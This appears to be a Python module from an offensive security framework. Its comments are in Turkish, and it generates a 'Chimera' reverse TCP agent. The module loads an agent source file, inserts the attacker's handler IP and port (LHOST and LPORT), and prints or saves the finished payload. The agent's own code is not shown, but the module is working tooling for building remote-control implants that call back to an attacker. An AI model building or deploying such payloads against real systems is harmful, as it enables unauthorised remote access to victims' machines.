from core.module import BaseModule
from core.option import Option
from typing import Dict, Any
import os

class Payload(BaseModule):
    """
    Chimera Core Agent - Reverse TCP Payload Generator.
    Gelişmiş Chimera ajanını üretir. Sadece Python 3 standart kütüphaneleri kullanır.
    """
    Name = "Chimera Core Agent"
    Description = "Chimera reverse TCP ajanı. Sadece stdlib, reconnect ve sysinfo desteği."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP (Handler)."),
            "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).", completion_dir=".")
        }

    def generate(self) -> str:
        """Chimera agent kodunu okur, LHOST/LPORT değerlerini gömerek payload üretir.
        
        Returns:
            str: Çalıştırılabilir Python payload kodu.
        """
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Agent kaynak kodunu oku
        agent_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "..", "..", "..", "..",   # modules/payloads/python/chimera/ → proje kökü
            "payloads", "python", "chimera_agent.py"
        )
        agent_path = os.path.normpath(agent_path)

        try:
            with open(agent_path, "r", encoding="utf-8") as f:
                agent_code = f.read()
        except FileNotFoundError:
            return f"[!] Hata: Agent dosyası bulunamadı: {agent_path}"

        # Placeholder'ları gerçek değerlerle değiştir
        agent_code = agent_code.replace('LHOST = "{{LHOST}}"', f'LHOST = "{lhost}"')
        agent_code = agent_code.replace("LPORT = {{LPORT}}", f"LPORT = {lport}")

        return agent_code

    def run(self, options: Dict[str, Any]):
        """Payload oluştur ve ekrana bas veya dosyaya kaydet."""
        code = self.generate()

        # Hata kontrolü
        if code.startswith("[!]"):
            print(code)
            return code

        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".py"):
                output_path += ".py"

            try:
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(code)
                print(f"[*] Chimera payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] Chimera Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
